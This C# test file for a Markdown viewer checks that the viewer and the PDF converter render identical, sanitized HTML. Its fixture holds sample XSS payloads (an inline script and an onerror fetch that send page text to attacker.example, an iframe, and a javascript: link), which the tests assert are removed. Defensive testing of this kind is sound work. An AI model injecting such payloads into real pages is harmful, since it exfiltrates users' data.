using AngleSharp.Html.Parser;
using TigerMarkView.Core.Exporting;
using TigerMarkView.Core.Rendering;

namespace TigerMarkView.Core.Tests.Rendering;

/// <summary>
/// The viewer and PDF conversion apply one active-content policy because they render one HTML: the
/// page the viewer shows (and the GUI exports from its retained snapshot) is the page
/// <c>tiger-mark</c> converts, byte for byte, hostile content included.
/// </summary>
public class ActiveContentParityTests : IDisposable
{
    private const string HostileMarkdown = """
        # Review copy

        ![Remote](https://example.com/chart.png) ![Local](images/chart.png)

        <script>new Image().src = 'https://attacker.example/?d=' + document.body.innerText;</script>

        <img src="missing.png" onerror="fetch('https://attacker.example/onerror')">

        <iframe src="https://attacker.example/frame"></iframe>

        [Click](javascript:alert(1))
        """;

    private readonly string _directory =
        Directory.CreateDirectory(Path.Combine(Path.GetTempPath(), $"tmv-parity-{Guid.NewGuid():N}")).FullName;

    [Fact]
    public void TheViewerAndTheCommandLineRenderTheSameSanitizedPage()
    {
        var path = Path.Combine(_directory, "review.md");
        File.WriteAllText(path, HostileMarkdown);
        var pageSetup = PdfPageSetup.Default;

        // What the viewer displays, and what File > Export to PDF hands the exporter.
        var viewed = RenderedDocument.Load(path, MarkdownTheme.Light, pageSetup);

        // What tiger-mark converts.
        var converted = MarkdownDocumentLoader.RenderHtmlDocument(path, File.ReadAllText(path), MarkdownTheme.Light, pageSetup);

        Assert.Equal(converted, viewed.Html);
        AssertInert(viewed.Html);
    }

    /// <summary>
    /// A theme or page-setup change re-renders the retained Markdown; the re-rendered page is held to the
    /// same policy as the first render, so an export after a theme switch is no less safe.
    /// </summary>
    [Fact]
    public void AReRenderedSnapshotStaysSanitized()
    {
        var path = Path.Combine(_directory, "review.md");
        File.WriteAllText(path, HostileMarkdown);

        var rerendered = RenderedDocument.Load(path)
            .WithTheme(MarkdownTheme.Dark)
            .WithRenderingOptions(new MarkdownRenderingOptions(EmojiShortcodes: true, SyntaxHighlighting: true))
            .WithPageSetup(PdfPageSetup.For(PdfPaperSize.Letter, PdfOrientation.Landscape, PdfMarginPreset.Wide, showPageNumbers: true));

        AssertInert(rerendered.Html);
    }

    public void Dispose() => Directory.Delete(_directory, recursive: true);

    private static void AssertInert(string html)
    {
        var document = new HtmlParser().ParseDocument(html);

        // The shell's own script is the only one, and the policy that admits it is present.
        Assert.Single(document.QuerySelectorAll("script"));
        Assert.Single(document.QuerySelectorAll("meta[http-equiv='Content-Security-Policy']"));
        Assert.Empty(document.QuerySelectorAll("iframe, [onerror], a[href^='javascript:']"));
        Assert.DoesNotContain("attacker.example", html, StringComparison.Ordinal);

        // Passive images survive, relative ones still resolved by the document's own base.
        Assert.NotNull(document.QuerySelector("img[src='https://example.com/chart.png']"));
        Assert.NotNull(document.QuerySelector("img[src='images/chart.png']"));
        Assert.NotNull(document.QuerySelector("base[href^='file:']"));
    }
}
